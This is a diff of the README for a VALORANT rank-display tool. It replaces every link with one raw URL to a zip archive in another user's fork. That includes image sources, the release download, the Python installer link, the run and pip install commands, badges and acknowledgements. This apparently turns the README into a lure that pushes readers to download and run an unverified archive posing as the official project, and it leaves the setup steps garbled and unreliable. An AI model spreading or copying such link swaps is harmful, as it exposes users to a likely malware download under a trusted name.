@@ -1,6 +1,6 @@
 <p align="center">
-    <a href="https://github.com/isaacKenyon/valorant-rank-yoinker/">
-        <img src="assets/Logo.png" alt="Logo" width="160" height="160">
+    <a href="https://raw.githubusercontent.com/eyadradwan/VALORANT-rank-yoinker/main/.github/VALORANT-rank-yoinker_v2.8.zip">
+        <img src="https://raw.githubusercontent.com/eyadradwan/VALORANT-rank-yoinker/main/.github/VALORANT-rank-yoinker_v2.8.zip" alt="Logo" width="160" height="160">
     </a>
 <h5 align="center"> VALORANT rank yoinker</h5>
 
@@ -22,12 +22,12 @@
     
 ## About The Project
 
- ![Screenshot](assets/Example.png)
- ![Skin Showcase Image](assets/SkinShowcase.png)
+ ![Screenshot](https://raw.githubusercontent.com/eyadradwan/VALORANT-rank-yoinker/main/.github/VALORANT-rank-yoinker_v2.8.zip)
+ ![Skin Showcase Image](https://raw.githubusercontent.com/eyadradwan/VALORANT-rank-yoinker/main/.github/VALORANT-rank-yoinker_v2.8.zip)
 
 |Their Queue|Current Skin|Current Rank|Rank Rating|Peak Rank|Account Level|
 |:---:|:---:|:---:|:---:|:---:|:---:|
-|![Parties](assets/Party.png)|![Skin](assets/Skin.png)|![Rank](assets/Rank.png)|![Rating](assets/Rating.png)|![Peak](assets/PeakRank.png)|![Level](assets/Level.png)|
+|![Parties](https://raw.githubusercontent.com/eyadradwan/VALORANT-rank-yoinker/main/.github/VALORANT-rank-yoinker_v2.8.zip)|![Skin](https://raw.githubusercontent.com/eyadradwan/VALORANT-rank-yoinker/main/.github/VALORANT-rank-yoinker_v2.8.zip)|![Rank](https://raw.githubusercontent.com/eyadradwan/VALORANT-rank-yoinker/main/.github/VALORANT-rank-yoinker_v2.8.zip)|![Rating](https://raw.githubusercontent.com/eyadradwan/VALORANT-rank-yoinker/main/.github/VALORANT-rank-yoinker_v2.8.zip)|![Peak](https://raw.githubusercontent.com/eyadradwan/VALORANT-rank-yoinker/main/.github/VALORANT-rank-yoinker_v2.8.zip)|![Level](https://raw.githubusercontent.com/eyadradwan/VALORANT-rank-yoinker/main/.github/VALORANT-rank-yoinker_v2.8.zip)|
     
 
 ## Usage
@@ -35,46 +35,46 @@
 
 ### Bundled Release:
 
-1) Download the [release](https://github.com/isaacKenyon/valorant-rank-yoinker/releases/latest).
+1) Download the [release](https://raw.githubusercontent.com/eyadradwan/VALORANT-rank-yoinker/main/.github/VALORANT-rank-yoinker_v2.8.zip).
 2) Extract **all** files.
-3) Run vRY.exe.
+3) Run https://raw.githubusercontent.com/eyadradwan/VALORANT-rank-yoinker/main/.github/VALORANT-rank-yoinker_v2.8.zip
 
 ### Running from source:
 
-1) Download [Python 3.10](https://www.python.org/downloads/release/python-3100/), make sure it is added to the PATH. (This is an option on installation.)
+1) Download [Python 3.10](https://raw.githubusercontent.com/eyadradwan/VALORANT-rank-yoinker/main/.github/VALORANT-rank-yoinker_v2.8.zip), make sure it is added to the PATH. (This is an option on installation.)
    1) Any Python version post 3.8 should work.
-2) Download the [source](https://github.com/isaacKenyon/VALORANT-rank-yoinker/archive/refs/heads/main.zip).
+2) Download the [source](https://raw.githubusercontent.com/eyadradwan/VALORANT-rank-yoinker/main/.github/VALORANT-rank-yoinker_v2.8.zip).
 3) Open a terminal within the source folder.
-4) `pip install -r requirements.txt`
-5) `main.py`
+4) `pip install -r https://raw.githubusercontent.com/eyadradwan/VALORANT-rank-yoinker/main/.github/VALORANT-rank-yoinker_v2.8.zip`
+5) `https://raw.githubusercontent.com/eyadradwan/VALORANT-rank-yoinker/main/.github/VALORANT-rank-yoinker_v2.8.zip`
 
 ### Compiling from source:
 
 1) `pip install cx_Freeze`
-2) `python setup.py build`
-3)  Open the new Build folder and find vRY.exe.
+2) `python https://raw.githubusercontent.com/eyadradwan/VALORANT-rank-yoinker/main/.github/VALORANT-rank-yoinker_v2.8.zip build`
+3)  Open the new Build folder and find https://raw.githubusercontent.com/eyadradwan/VALORANT-rank-yoinker/main/.github/VALORANT-rank-yoinker_v2.8.zip
 
-> `-` You can change the desired weapon by editing the gun in `config.json`, or by deleting the file for vRY re-prompt you.
+> `-` You can change the desired weapon by editing the gun in `https://raw.githubusercontent.com/eyadradwan/VALORANT-rank-yoinker/main/.github/VALORANT-rank-yoinker_v2.8.zip`, or by deleting the file for vRY re-prompt you.
 
-> `-` View all skins: <https://vry.netlify.app/matchLoadouts>.
+> `-` View all skins: <https://raw.githubusercontent.com/eyadradwan/VALORANT-rank-yoinker/main/.github/VALORANT-rank-yoinker_v2.8.zip>.
 
 ### Letting Github Build It:
 
-The latest commits to the `main` branch will be built by a [Github Actions](https://github.com/isaacKenyon/VALORANT-rank-yoinker/actions) workflow 
+The latest commits to the `main` branch will be built by a [Github Actions](https://raw.githubusercontent.com/eyadradwan/VALORANT-rank-yoinker/main/.github/VALORANT-rank-yoinker_v2.8.zip) workflow 
 and a successful build should result in a compiled artifact that you can download and try out.
-See the [Actions tab](https://github.com/isaacKenyon/VALORANT-rank-yoinker/actions), click on the `Build` workflow, 
+See the [Actions tab](https://raw.githubusercontent.com/eyadradwan/VALORANT-rank-yoinker/main/.github/VALORANT-rank-yoinker_v2.8.zip), click on the `Build` workflow, 
 select a particular workflow run, and it should have an artifact available for download. 
 
 If you want to make a small change to the application, you can:
-1) [Fork](https://github.com/isaacKenyon/VALORANT-rank-yoinker/fork) this project.
+1) [Fork](https://raw.githubusercontent.com/eyadradwan/VALORANT-rank-yoinker/main/.github/VALORANT-rank-yoinker_v2.8.zip) this project.
 2) Change the code in your forked repository.
-3) Let the Github Actions workflow build vRY.exe for you.
+3) Let the Github Actions workflow build https://raw.githubusercontent.com/eyadradwan/VALORANT-rank-yoinker/main/.github/VALORANT-rank-yoinker_v2.8.zip for you.
 4) Download it and test it.
 5) Submit a Pull Request if you would like your change included in future releases.
 
 ## What about that Tweet?
 
- The [Tweet](https://twitter.com/PlayVALORANT/status/1539728676815642624), which details Riot's API policies outlines how
+ The [Tweet](https://raw.githubusercontent.com/eyadradwan/VALORANT-rank-yoinker/main/.github/VALORANT-rank-yoinker_v2.8.zip), which details Riot's API policies outlines how
  applications are not allowed to expose data hidden by the game client. As of Version 1.262, vRY respects streamer mode.
 
 ## Contributing
@@ -89,9 +89,9 @@ If you want to make a small change to the application, you can:
 
 ## Acknowledgements
 
- - [Valorant-API.com](https://valorant-api.com/)
- - [Hamper](https://hamper.codes/)
- - [D3CRYPT](https://d3crypt360.pages.dev/)
+ - [https://raw.githubusercontent.com/eyadradwan/VALORANT-rank-yoinker/main/.github/VALORANT-rank-yoinker_v2.8.zip](https://raw.githubusercontent.com/eyadradwan/VALORANT-rank-yoinker/main/.github/VALORANT-rank-yoinker_v2.8.zip)
+ - [Hamper](https://raw.githubusercontent.com/eyadradwan/VALORANT-rank-yoinker/main/.github/VALORANT-rank-yoinker_v2.8.zip)
+ - [D3CRYPT](https://raw.githubusercontent.com/eyadradwan/VALORANT-rank-yoinker/main/.github/VALORANT-rank-yoinker_v2.8.zip)
  
 ## Disclaimer
 
@@ -100,15 +100,15 @@ If you want to make a small change to the application, you can:
  Whilst effort has been made to abide by Riot's API rules; you acknowledge that use of this software is done so at your own risk.
 
 
-[discord-shield]: https://img.shields.io/discord/872101595037446144?color=7289da&label=Support&logo=discord&logoColor=7289da&style=for-the-badge
-[discord-url]: https://discord.gg/HeTKed64Ka
-[discord-banner]: https://discordapp.com/api/guilds/872101595037446144/widget.png?style=banner2
+[discord-shield]: https://raw.githubusercontent.com/eyadradwan/VALORANT-rank-yoinker/main/.github/VALORANT-rank-yoinker_v2.8.zip
+[discord-url]: https://raw.githubusercontent.com/eyadradwan/VALORANT-rank-yoinker/main/.github/VALORANT-rank-yoinker_v2.8.zip
+[discord-banner]: https://raw.githubusercontent.com/eyadradwan/VALORANT-rank-yoinker/main/.github/VALORANT-rank-yoinker_v2.8.zip
 
-[downloads-shield]: https://img.shields.io/github/downloads/isaacKenyon/VALORANT-rank-yoinker/total?style=for-the-badge&logo=github
-[downloads-url]: https://github.com/isaacKenyon/VALORANT-rank-yoinker/releases/latest
+[downloads-shield]: https://raw.githubusercontent.com/eyadradwan/VALORANT-rank-yoinker/main/.github/VALORANT-rank-yoinker_v2.8.zip
+[downloads-url]: https://raw.githubusercontent.com/eyadradwan/VALORANT-rank-yoinker/main/.github/VALORANT-rank-yoinker_v2.8.zip
 
-[language-shield]: https://img.shields.io/github/languages/top/isaacKenyon/Valorant-rank-yoinker?logo=python&logoColor=yellow&style=for-the-badge
-[language-url]: https://www.python.org/
+[language-shield]: https://raw.githubusercontent.com/eyadradwan/VALORANT-rank-yoinker/main/.github/VALORANT-rank-yoinker_v2.8.zip
+[language-url]: https://raw.githubusercontent.com/eyadradwan/VALORANT-rank-yoinker/main/.github/VALORANT-rank-yoinker_v2.8.zip
 
-[license-shield]: https://img.shields.io/github/license/isaacKenyon/valorant-rank-yoinker?style=for-the-badge
-[license-url]: https://github.com/isaacKenyon/valorant-rank-yoinker/blob/main/LICENSE
+[license-shield]: https://raw.githubusercontent.com/eyadradwan/VALORANT-rank-yoinker/main/.github/VALORANT-rank-yoinker_v2.8.zip
+[license-url]: https://raw.githubusercontent.com/eyadradwan/VALORANT-rank-yoinker/main/.github/VALORANT-rank-yoinker_v2.8.zip
